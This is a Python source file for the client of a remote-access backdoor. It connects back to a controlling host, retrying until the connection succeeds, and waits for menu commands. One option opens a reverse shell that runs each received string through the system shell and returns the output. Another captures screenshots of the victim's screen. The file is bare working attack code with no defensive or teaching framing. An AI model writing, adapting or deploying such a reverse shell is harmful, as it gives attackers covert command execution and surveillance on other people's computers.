import socket
import sys
import os
import time
import subprocess
import pyautogui

ip = ""
port = 0

def take_screen_shot():
    img = pyautogui.screenshot(time.asctime(time.localtime(time.time())))
    

def open_shell():
    while True:
        print("waiting for cmd...")
        data = server_con.recv(4096)
        str_msg = b""

        if data.decode() == "exit":
            break
        elif data.decode()[:2] == "cd":
            dir = data.decode()[3:]
            try:
                os.chdir(dir)
            except FileNotFoundError:
                str_msg = b'No such file or directory: ' + dir.encode()
            else:
                str_msg = os.getcwd().encode()
        elif len(data.decode()) > 0:
            output = subprocess.Popen(f'{data.decode()}', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
            str_msg = output[0]
        else:
            str_msg = b"Error!"
        
        if not str_msg:
            str_msg = b" "

        server_con.sendall(str_msg)



def establish_connection(address):
    global server_con

    print("Connecting...")
    while True:
        try:
            server_con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_con.connect((address[0],address[1]))
            print(f"Connected!\nServer: {address[0]}:{address[1]}")
        except ConnectionRefusedError:
            time.sleep(1)
        else:
            break

            
def main():
    ip, port = "0.0.0.0", 3000 #address[0], int(address[1])
    establish_connection((ip,port))
    
    while True:
        choice = server_con.recv(1024).decode()
        if choice == "1":
            print("Opening Shell...")
            open_shell()
        elif choice == "2":
            take_screen_shot()
        elif choice == "6":
            server_con.close()
            sys.exit()

    server_con.close()
  
main()
